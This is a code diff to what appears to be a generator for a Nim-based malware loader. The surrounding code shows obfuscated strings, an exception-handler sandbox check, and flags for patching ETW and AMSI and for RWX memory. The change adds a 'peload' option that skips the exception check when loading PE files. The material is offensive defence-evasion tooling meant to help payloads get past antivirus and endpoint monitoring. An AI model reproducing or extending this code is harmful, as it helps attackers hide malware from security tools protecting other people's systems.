@@ -2659,19 +2659,20 @@ proc VEHHandler (pExceptInfo: PEXCEPTION_POINTERS): LONG {.stdcall.}=
 
 proc CreatedInterrupt(): bool =
     when not defined(csharp):
-        when defined(verbose):
-            echo obf("[*] Adding Exception Handler...")
-        AddVectoredExceptionHandler(1, VEHHandler)
-        when defined(verbose):
-            echo obf("[*] Raising exception...")
-        RaiseException(EXCEPTION_BREAKPOINT, 0, 0, nil)
-        when defined(verbose):
-            echo obf("[*] Removing ExceptionHandler...")
-        RemoveVectoredExceptionHandler(VEHHandler)
-        return true
+        when not defined(peload):
+            when defined(verbose):
+                echo obf("[*] Adding Exception Handler...")
+            AddVectoredExceptionHandler(1, VEHHandler)
+            when defined(verbose):
+                echo obf("[*] Raising exception...")
+            RaiseException(EXCEPTION_BREAKPOINT, 0, 0, nil)
+            when defined(verbose):
+                echo obf("[*] Removing ExceptionHandler...")
+            RemoveVectoredExceptionHandler(VEHHandler)
+            return true
     else:
         when defined(verbose):
-            echo obf("[*] Exception Handler Check disabled for loading csharp assemblies as its causing crashes...")
+            echo obf("[*] Exception Handler Check disabled for loading csharp assemblies or PEs as its causing problems...")
         return true
 """
 
@@ -3164,6 +3165,9 @@ if(ETW):
 
 if(AMSIProviderPatch):
     basicCompileFlags.add("-d:ProviderPatch ")
+
+if(peload):
+    basicCompileFlags.add("-d:peload ")
 
 if(RWX == false):
     basicCompileFlags.add("-d:RX ")
